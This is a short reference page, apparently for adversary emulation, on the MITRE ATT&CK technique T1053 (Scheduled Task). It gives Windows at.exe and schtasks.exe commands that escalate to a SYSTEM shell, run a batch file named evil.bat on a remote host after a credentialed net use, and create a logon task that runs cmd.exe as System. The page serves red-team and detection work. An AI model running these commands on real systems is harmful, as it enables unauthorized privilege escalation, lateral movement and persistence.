## Scheduled Task

MITRE ATT&CK Technique: [T1053](https://attack.mitre.org/wiki/Technique/T1053)

### Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time

[Examples Of Creating Tasks](https://technet.microsoft.com/en-us/library/cc725744(v=ws.11).aspx#BKMK_create)

## at.exe

Note: deprecated in Windows 8+

### Privileged Escalation

This command can be used locally to escalate privilege to SYSTEM or be used across a network to execute commands on another system.

Input:

    at 13:20 /interactive cmd

Example:

    net use \\[computername|IP] /user:DOMAIN\username password
    net time \\[computername|IP]
    at \\[computername|IP] 13:20 c:\temp\evil.bat

## schtask.exe

### Launch Interactive cmd.exe

Input:

    SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10

Input:

    schtasks /create /tn "mysc" /tr C:\windows\system32\cmd.exe /sc ONLOGON /ru "System"
